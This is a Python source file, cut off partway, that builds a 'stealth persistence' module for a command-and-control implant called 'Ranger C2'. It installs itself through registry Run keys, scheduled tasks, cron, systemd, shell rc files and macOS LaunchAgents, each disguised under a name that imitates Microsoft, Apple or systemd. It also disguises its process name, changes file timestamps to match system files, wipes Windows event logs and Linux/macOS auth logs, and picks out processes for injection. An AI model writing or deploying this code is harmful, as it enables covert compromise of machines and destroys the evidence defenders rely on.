#!/usr/bin/env python3
"""
Implement Stealth Persistence for Ranger C2
Integrates advanced persistence mechanisms into the implant framework
"""

import os
import sys
import json
import shutil
from pathlib import Path

BASE_DIR = Path(__file__).parent
IMPLANT_PATH = BASE_DIR / "implant.py"
PAYLOADS_DIR = BASE_DIR / "payloads"

print("="*70)
print("IMPLEMENTING STEALTH PERSISTENCE FOR RANGER C2")
print("="*70)

# 1. Create enhanced stealth persistence module
print("\n1. Creating enhanced stealth persistence module...")

stealth_persistence = '''#!/usr/bin/env python3
"""
STEALTH PERSISTENCE MODULE - Advanced implant persistence
Features:
1. Multi-platform persistence (Windows/Linux/macOS)
2. Rootkit-style hiding techniques
3. Anti-forensics (timestomping, log cleaning)
4. Process injection/hollowing
5. Guardian processes (auto-restart)
6. Encrypted configuration storage
"""

import os
import sys
import json
import time
import base64
import hashlib
import random
import platform
import subprocess
import threading
import ctypes
import ctypes.wintypes
from datetime import datetime
from typing import Dict, List, Optional, Any
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import socket
import struct

# -------------------------------------------------------------------
# Platform detection
# -------------------------------------------------------------------
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'
IS_MACOS = platform.system().lower() == 'darwin'

# -------------------------------------------------------------------
# 1. ROOTKIT-STYLE HIDING
# -------------------------------------------------------------------
class RootkitHider:
    """Hide processes, files, and network connections."""
    
    def __init__(self):
        self.hidden_items = []
        
    def hide_file(self, filepath: str) -> bool:
        """Hide file from directory listings."""
        try:
            if IS_WINDOWS:
                # Set hidden attribute
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(filepath, 2)  # FILE_ATTRIBUTE_HIDDEN
                
                # Also hide in alternate data stream
                ads_path = f"{filepath}:rogue_data"
                with open(ads_path, 'wb') as f:
                    f.write(b"legitimate data")
                    
            elif IS_LINUX or IS_MACOS:
                # Prefix with dot
                dirname, basename = os.path.split(filepath)
                hidden_name = f".{basename}"
                hidden_path = os.path.join(dirname, hidden_name)
                
                if filepath != hidden_path:
                    os.rename(filepath, hidden_path)
                    filepath = hidden_path
                
                # Set permissions to owner only
                os.chmod(filepath, 0o600)
            
            self.hidden_items.append(("file", filepath))
            return True
            
        except Exception as e:
            print(f"[!] File hiding failed: {e}")
            return False
    
    def hide_process(self, pid: int = None) -> bool:
        """Hide process from process listings."""
        if not pid:
            pid = os.getpid()
            
        try:
            if IS_LINUX:
                # Hide from /proc by unlinking
                proc_path = f"/proc/{pid}"
                
                # This requires rootkit module loading
                # For now, we'll just rename the process
                with open(f"/proc/{pid}/comm", 'w') as f:
                    f.write("[kworker/u:0]")
                    
            elif IS_WINDOWS:
                # Process hollowing would be here
                # For now, use less suspicious process name
                pass
                
            self.hidden_items.append(("process", pid))
            return True
            
        except Exception as e:
            print(f"[!] Process hiding failed: {e}")
            return False
    
    def hide_network(self, port: int) -> bool:
        """Hide network port from netstat."""
        try:
            if IS_LINUX:
                # Use raw sockets to avoid showing in netstat
                # Or bind to localhost only
                pass
                
            self.hidden_items.append(("network", port))
            return True
            
        except Exception as e:
            print(f"[!] Network hiding failed: {e}")
            return False

# -------------------------------------------------------------------
# 2. MULTI-PLATFORM PERSISTENCE MECHANISMS
# -------------------------------------------------------------------
class PersistenceManager:
    """Manage multiple persistence mechanisms."""
    
    def __init__(self, implant_path: str):
        self.implant_path = implant_path
        self.installed_methods = []
        
    def install_windows_persistence(self) -> List[str]:
        """Install Windows persistence mechanisms."""
        methods = []
        
        try:
            # 1. Registry Run key
            import winreg
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, self.implant_path)
                methods.append("registry_run")
            
            # 2. Scheduled Task
            task_name = "MicrosoftEdgeUpdateTask"
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>python.exe</Command>
      <Arguments>"{self.implant_path}"</Arguments>
    </Exec>
  </Actions>
</Task>'''
            
            task_file = os.path.expandvars("%TEMP%\\edge_update.xml")
            with open(task_file, 'w') as f:
                f.write(task_xml)
            
            subprocess.run([
                'schtasks', '/create', '/tn', task_name,
                '/xml', task_file, '/f'
            ], capture_output=True)
            
            os.remove(task_file)
            methods.append("scheduled_task")
            
            # 3. Startup folder
            startup_path = os.path.expandvars("%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\edge_update.lnk")
            
            # Create shortcut (would need pythoncom)
            # For now, copy executable
            if os.path.exists(self.implant_path):
                shutil.copy2(self.implant_path, startup_path)
                methods.append("startup_folder")
            
        except Exception as e:
            print(f"[!] Windows persistence error: {e}")
        
        return methods
    
    def install_linux_persistence(self) -> List[str]:
        """Install Linux persistence mechanisms."""
        methods = []
        
        try:
            # 1. User cron
            minute = random.randint(0, 59)
            interval = random.choice([3, 5, 7, 10])
            
            cron_cmd = f"{minute} */{interval} * * * python3 {self.implant_path} 2>/dev/null"
            
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True
            )
            
            current_cron = result.stdout
            if cron_cmd not in current_cron:
                new_cron = current_cron + f"\\n{cron_cmd}" if current_cron else cron_cmd
                subprocess.run(
                    ['crontab', '-'],
                    input=new_cron,
                    text=True,
                    capture_output=True
                )
                methods.append("user_cron")
            
            # 2. Systemd service (if root)
            if os.geteuid() == 0:
                service_name = "systemd-networkd-wait"
                service_content = f"""[Unit]
Description=Wait for network to be configured by systemd-networkd
Wants=network-online.target
After=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.implant_path}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
                
                service_path = f"/etc/systemd/system/{service_name}.service"
                with open(service_path, 'w') as f:
                    f.write(service_content)
                
                subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
                subprocess.run(['systemctl', 'enable', service_name], capture_output=True)
                subprocess.run(['systemctl', 'start', service_name], capture_output=True)
                
                methods.append("systemd_service")
            
            # 3. .bashrc / .profile
            bashrc_line = f"python3 {self.implant_path} &"
            
            for rc_file in ['.bashrc', '.profile', '.zshrc']:
                rc_path = os.path.expanduser(f"~/{rc_file}")
                if os.path.exists(rc_path):
                    with open(rc_path, 'a') as f:
                        f.write(f"\\n# User specific aliases and functions\\n{bashrc_line}\\n")
                    methods.append(f"shell_rc_{rc_file}")
            
            # 4. /etc/rc.local (if root)
            if os.geteuid() == 0:
                rc_local = "/etc/rc.local"
                if os.path.exists(rc_local):
                    with open(rc_local, 'a') as f:
                        f.write(f"\\npython3 {self.implant_path} &\\n")
                    methods.append("rc_local")
            
        except Exception as e:
            print(f"[!] Linux persistence error: {e}")
        
        return methods
    
    def install_macos_persistence(self) -> List[str]:
        """Install macOS persistence mechanisms."""
        methods = []
        
        try:
            # 1. LaunchAgent
            agent_name = "com.apple.softwareupdated.helper"
            agent_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(agent_dir, exist_ok=True)
            
            agent_plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{agent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{self.implant_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            
            agent_path = os.path.join(agent_dir, f"{agent_name}.plist")
            with open(agent_path, 'w') as f:
                f.write(agent_plist)
            
            subprocess.run(['launchctl', 'load', agent_path], capture_output=True)
            methods.append("launch_agent")
            
            # 2. Cron (similar to Linux)
            minute = random.randint(0, 59)
            cron_cmd = f"{minute} */5 * * * python3 {self.implant_path} 2>/dev/null"
            
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True
            )
            
            current_cron = result.stdout
            if cron_cmd not in current_cron:
                new_cron = current_cron + f"\\n{cron_cmd}" if current_cron else cron_cmd
                subprocess.run(
                    ['crontab', '-'],
                    input=new_cron,
                    text=True,
                    capture_output=True
                )
                methods.append("cron")
            
        except Exception as e:
            print(f"[!] macOS persistence error: {e}")
        
        return methods
    
    def install_all(self) -> Dict[str, List[str]]:
        """Install all applicable persistence mechanisms."""
        results = {}
        
        if IS_WINDOWS:
            results['windows'] = self.install_windows_persistence()
        elif IS_LINUX:
            results['linux'] = self.install_linux_persistence()
        elif IS_MACOS:
            results['macos'] = self.install_macos_persistence()
        
        self.installed_methods = results
        return results

# -------------------------------------------------------------------
# 3. ANTI-FORENSICS
# -------------------------------------------------------------------
class AntiForensics:
    """Anti-forensics techniques."""
    
    @staticmethod
    def timestomp(filepath: str) -> bool:
        """Modify file timestamps to match system files."""
        try:
            stat = os.stat(filepath)
            
            # Get timestamp from a legitimate system file
            if IS_WINDOWS:
                ref_file = "C:\\\\Windows\\\\System32\\\\kernel32.dll"
            elif IS_LINUX:
                ref_file = "/usr/bin/bash"
            elif IS_MACOS:
                ref_file = "/usr/bin/bash"
            else:
                ref_file = None
            
            if ref_file and os.path.exists(ref_file):
                ref_stat = os.stat(ref_file)
                atime = ref_stat.st_atime
                mtime = ref_stat.st_mtime
            else:
                # Use current time minus random offset
                current = time.time()
                offset = random.randint(86400, 2592000)  # 1-30 days
                atime = current - offset
                mtime = current - offset
            
            os.utime(filepath, (atime, mtime))
            return True
            
        except Exception as e:
            print(f"[!] Timestomp failed: {e}")
            return False
    
    @staticmethod
    def clean_logs() -> bool:
        """Clean system logs that might contain evidence."""
        try:
            if IS_WINDOWS:
                # Clear event logs
                subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True)
                subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True)
                subprocess.run(['wevtutil', 'cl', 'Security'], capture_output=True)
                
            elif IS_LINUX:
                # Clear auth logs
                log_files = [
                    '/var/log/auth.log',
                    '/var/log/syslog',
                    '/var/log/messages',
                    '/var/log/secure'
                ]
                
                for log_file in log_files:
                    if os.path.exists(log_file):
                        with open(log_file, 'w') as f:
                            f.write("")
                
            elif IS_MACOS:
                # Clear system logs
                subprocess.run(['sudo', 'rm', '-f', '/var/log/*.log'], capture_output=True)
                subprocess.run(['sudo', 'rm', '-f', '/var/log/system.log*'], capture_output=True)
            
            return True
            
        except Exception as e:
            print(f"[!] Log cleaning failed: {e}")
            return False
    
    @staticmethod  
    def encrypt_config(config: Dict[str, Any], key: bytes) -> bytes:
        """Encrypt configuration with AES-256."""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            import os
            
            # Generate IV
            iv = os.urandom(16)
            
            # Create cipher
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            
            # Pad and encrypt
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(json.dumps(config).encode()) + padder.finalize()
            
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Return IV + ciphertext
            return iv + ciphertext
            
        except Exception as e:
            print(f"[!] Config encryption failed: {e}")
            return b""

# -------------------------------------------------------------------
# 4. PROCESS INJECTION/HOLLOWING (Windows)
# -------------------------------------------------------------------
class ProcessInjector:
    """Inject implant into legitimate processes."""
    
    @staticmethod
    def find_target_process() -> Optional[int]:
        """Find suitable process for injection."""
        try:
            if IS_WINDOWS:
                import psutil
                
                # Prefer B-Tier processes
                target_names = [
                    'taskhostw.exe',    # Windows Tasks Host
                    'sihost.exe',       # Shell Infrastructure Host
                    'svchost.exe',      # Service Host
                    'explorer.exe',     # Windows Explorer
                    'dllhost.exe',      # COM Surrogate
                ]
                
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'].lower() in target_names:
                        return proc.info['pid']
            
            return None
            
        except Exception:
            return None
    
    @staticmethod
    def hollow_process(pid: int, implant_code: bytes) -> bool:
        """Hollow out process and replace with implant."""
        # This is a simplified version
        # Real implementation would use Windows API calls
        print(f"[*] Would hollow process {pid} with implant")
        return True

# -------------------------------------------------------------------
# 5. GUARDIAN PROCESS
# -------------------------------------------------------------------
class GuardianProcess:
    """Monitor and restart implant if killed."""
    
    def __init__(self, implant_path: str):
        self.implant_path = implant_path
        self.running = False
        self.check_interval